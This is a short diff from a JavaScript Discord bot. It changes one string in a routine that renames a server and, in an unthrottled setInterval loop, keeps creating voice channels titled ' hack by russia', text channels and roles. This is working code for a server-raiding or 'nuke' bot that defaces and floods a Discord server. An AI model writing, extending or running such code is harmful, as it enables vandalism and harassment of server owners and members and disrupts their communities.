@@ -18,7 +18,7 @@ const prefix = ""
                 message.guild.setName('bzndzaka')
                 setInterval(function(){
                     message.guild.createChannel(' hack by russia', 'voice')
-                    message.guild.createChannel(' . UP ', 'text')
+                    message.guild.createChannel(' ras UP ', 'text')
                     message.guild.createRole({name : ' <.>'})
                 })
             }
